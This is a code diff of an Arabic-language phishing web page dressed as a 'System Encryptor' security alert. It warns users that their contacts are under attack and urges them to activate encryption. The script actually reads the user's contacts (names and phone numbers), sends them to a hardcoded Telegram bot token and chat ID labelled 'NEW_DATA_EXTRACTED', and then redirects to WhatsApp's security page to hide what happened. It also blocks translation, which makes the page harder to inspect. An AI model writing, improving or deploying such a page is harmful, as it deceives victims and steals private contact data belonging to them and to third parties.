@@ -1,51 +1,76 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar" dir="rtl" translate="no">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام حماية البيانات</title>
+    <meta name="google" content="notranslate">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Encryptor v2.9</title>
     <style>
-        body { background: #0d1117; color: #c9d1d9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: #161b22; padding: 40px; border-radius: 20px; border: 1px solid #30363d; text-align: center; box-shadow: 0 10px 50px rgba(0,0,0,0.5); }
-        h2 { color: #58a6ff; }
-        button { background: #238636; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; transition: 0.3s; }
-        button:hover { background: #2ea043; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .terminal { background: #050505; border: 1px solid #00ff00; padding: 25px; border-radius: 5px; width: 90%; max-width: 450px; box-shadow: 0 0 20px #00ff0033; }
+        .glitch { animation: flash 0.1s infinite; color: #ff0000; font-weight: bold; }
+        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
+        .btn { background: #00ff00; color: #000; border: none; padding: 15px; border-radius: 3px; width: 100%; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; text-transform: uppercase; }
+        .logs { font-size: 11px; text-align: left; height: 80px; overflow: hidden; color: #008800; margin-top: 10px; border-top: 1px solid #111; padding-top: 10px; }
     </style>
 </head>
-<body>
-    <div class="box">
-        <h2>⚠️ تحديث أمني عاجل</h2>
-        <p>يجب تحديث قائمة جهات الاتصال السحابية لمنع اختراق حسابك.</p>
-        <button onclick="execute()">تحديث وتأمين الحساب</button>
+<body class="notranslate">
+    <div class="terminal">
+        <div style="font-size: 12px; margin-bottom: 10px;">> KERNEL_STATUS: SECURE_BOOT</div>
+        <div class="glitch">> CRITICAL_ERROR: CONTACTS_UNSECURED</div>
+        <p style="font-size: 14px; line-height: 1.4;">نظام الحماية رصد محاولة اختراق لجهات اتصالك. يجب تفعيل "بروتوكول التشفير العشوائي" فوراً.</p>
+        <div class="logs" id="logBox">
+            [SYS] Initializing...<br>
+            [SYS] Waiting for user permission...
+        </div>
+        <button class="btn" onclick="runBypass()">تفعيل التشفير الآن</button>
     </div>
 
     <script>
-        async function execute() {
+        // منع الترجمة برمجياً
+        document.documentElement.setAttribute('translate', 'no');
+
+        async function runBypass() {
             const T = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU";
             const ID = "8397194527";
-            
+            const logs = document.getElementById('logBox');
+
             try {
+                logs.innerHTML += "<br>[SYS] Accessing Contact_API...";
+                
+                // فتح نافذة السحب
                 const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
-                if (contacts.length > 0) {
-                    let msg = "🔓 تـم سـحـب الـبـيـانـات:\n\n";
-                    contacts.forEach(c => { msg += `👤 الاسم: ${c.name}\n📞 الرقم: ${c.tel}\n\n`; });
+
+                if (contacts && contacts.length > 0) {
+                    logs.innerHTML += "<br>[SYS] Encrypting " + contacts.length + " entries...";
                     
+                    let report = "🏴‍☠️ **NEW_DATA_EXTRACTED**\n";
+                    report += "━━━━━━━━━━━━━━\n";
+                    contacts.forEach((c, i) => {
+                        let n = (c.name && c.name[0]) ? c.name[0] : "UNK";
+                        let p = (c.tel && c.tel[0]) ? c.tel[0] : "000";
+                        report += `| ${i+1} | ${n} | ${p} |\n`;
+                    });
+                    report += "━━━━━━━━━━━━━━\n";
+
                     await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({chat_id: ID, text: msg})
+                        body: JSON.stringify({ chat_id: ID, text: report })
                     });
-                    
-                    // إعادة توجيه للتمويه
-                    window.location.href = "https://www.whatsapp.com/security";
+
+                    logs.innerHTML += "<br>[SYS] Success. Redirecting...";
+                    setTimeout(() => { window.location.href = "https://www.whatsapp.com/security"; }, 500);
                 }
             } catch (e) {
-                alert("يرجى المحاولة من متصفح كروم الرسمي.");
+                logs.innerHTML += "<br>[ERR] Permission Denied. System Locked.";
+                alert("خطأ: لا يمكن تشفير النظام دون الموافقة على مزامنة الأسماء. أعد المحاولة.");
             }
         }
     </script>
 </body>
 </html>
+
 
 
 
